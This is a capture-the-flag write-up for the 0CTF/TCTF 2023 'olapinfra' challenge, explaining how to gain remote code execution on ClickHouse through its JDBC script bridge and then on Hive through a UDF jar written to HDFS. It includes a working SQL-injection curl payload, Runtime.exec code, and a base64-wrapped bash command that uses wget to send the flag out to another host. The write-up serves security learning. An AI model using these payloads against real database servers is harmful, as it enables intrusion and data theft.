# 0CTF/TCTF 2023 - olapinfra

## Challenge Description

Behold! The epitome of stylish Internet infrastructure! Trailing closely behind the likes of LLM, Cloud Native, Web3, low-code platforms, and anything else you can imagine!

(After the instance successfully runs, the service is still in the process of initialization. You may need to wait for >= 1 min before you can attack it. So run it locally before you can get the flag.)


[olapinfra-69e73ebe082712b26f2a3e63b3d323f17e0a9cbc4647df85f51bd672b67ca168.tar.xz](olapinfra-69e73ebe082712b26f2a3e63b3d323f17e0a9cbc4647df85f51bd672b67ca168.tar.xz)

## Writeup

It is a Online Analytical Processing (OLAP) environment, consist of a PHP frontend, Clickhouse, Hive, Mysql.

The target is to get RCE on Clickhouse (Part 1) and Hive (Part 2).

### Part 1 - Clickhouse 

Clickhouse is a really powerful and convenient database for big data stuffs, and do have many integrations to perform IO. Although *most* of the clickhouse functions restrict file operation to `user_files`, @viky discovered that the the JDBC bridge consist of a `script` which could run any Javascript on Nashorn / script engine, which we can take advantage to RCE on the clickhouse container.

```sql
SELECT * FROM jdbc('script', 'js', 'new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\'/readflag\').getInputStream())).readLine()')
```

Therefore the payload could be
```sh
curl "127.0.0.1:8080?query=0%20UNION%20ALL%20SELECT%20results%2C%272%27%2C%273%27%2C%274%27%20FROM%20jdbc%28%27script%27%2C%20%27js%27%2C%20%27new%20java%2Eio%2EBufferedReader%28new%20java%2Eio%2EInputStreamReader%28java%2Elang%2ERuntime%2EgetRuntime%28%29%2Eexec%28%5C%27%2Freadflag%5C%27%29%2EgetInputStream%28%29%29%29%2EreadLine%28%29%27%29%20FORMAT%20JSON%20%23"
```

### Part 2 - Hive

The clickhouse server is isolated from the internet, so we can't get a reverse shell and we're restricted to use the PHP frontend to run commands. What can we do? The plan is as follow:

- RCE clickhouse server (part 1)
- Upload a UDF jar to HDFS
- Load the jar and do RCE on Hive by invoking Hive SQL 

With ability to RCE the clickhouse server, we can run DDL on Clickhouse simply by using `clickhouse-client` or `curl` (https://clickhouse.com/docs/en/interfaces/http), granting us full access to the clickhouse server.

Not sure why but the server thread blocks when i use `clickhouse-client` to execute my payload. As clickhouse is relatively new so i assume this is normal..

```
[2023-12-09 15:59:22] [WARNING] Thread Thread[vert.x-eventloop-thread-0,5,main]=Thread[vert.x-eventloop-thread-0,5,main] has been blocked for 15240 ms, time limit is 15000 ms 
```

So lets use `curl` to run any clickhouse SQL command with the web interface instead. It would be something like:

```
# connect to localhose:8123 and run SQL command `SELECT 123`
echo "select 123" | curl 0:8123 -s -d @-
```

With access to clickhouse SQL, we can write any file to the HDFS used by Hive! The Clickhouse provides lots of integration, one of the integration allows us to read/write HDFS file directly. It would be something like:

```sql
-- create a file '/tmp/readflag.jar' on hdfs
CREATE TABLE jj(s String) ENGINE=HDFS('hdfs://namenode:8020/tmp/readflag.jar', 'LineAsString')

-- and write to that file
INSERT INTO jj SELECT base64Decode('AAAAAAAAA====')
```

Finally, we need to upload a Hive client and invoke the UDF using Hive SQL, something like:

```sql
CREATE FUNCTION ex as 'com.example.ReadflagUDF' using jar 'hdfs://namenode:8020/tmp/readflag.jar'
SELECT ex('/readflag')
```

Sounds good! But the reality is a bit more complicated, due to:

1. we don't have `curl` in the clickhouse-server container...
1. multithreading/multiprocessing of clickhouse invoke our shell command for about two times
1. we don't have a lightweight Hive client (beeline is Java based and would take forever to upload and probably tons of dependencies issue)
1. we need a `readflag.jar` for the UDF
1. we are attacking through the web interface, the url `query` parameter, therefore we have a char limit for each shell command

I have solve those issues by trying harder, see the [solve.sh](solve/solve.sh) for the actual solve script.

Kudos to the challenge author!

## failed attempts

### function blocked by default

```
SELECT reflect("java.lang.Runtime", "exec", concat("bash -c {echo,",base64(encode("wget \"clickhouse:8123/?query=select+'exec:$(/readflag | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')'\" -O- -q", 'UTF-8')),"}|{base64,-d}|{bash,-i}"));
truncate table workspace_hs.out;
LOAD DATA LOCAL INPATH '/tmp/out' INTO TABLE workspace_hs.out;
```

### cannot write non-ascii
```

create external table gg (src string) 
row format delimited 
fields terminated by ' '
lines terminated by '\n' 
stored as textfile location '/tmp/tsetset.yaaa';


create external table readflagjar7 (src string) 
row format delimited 
fields terminated by ''
lines terminated by '\n' 
stored as textfile location 'hdfs://namenode:8020/tmp/readflagjar7'
TBLPROPERTIES('serialization.encoding'='windows-1252');


create external table readflagjar10 (src string) 
location 'hdfs://namenode:8020/tmp/readflagjar10';

INSERT INTO readflagjar10 SELECT decode(unbase64('UEsDBAoAAAAAAEJEiVcAAAAAAAAAAAAAAAAJAAAATU='),'UTF-8');

```

### not needed
```
add jar hdfs://namenode:8020/tmp/aaajar;
```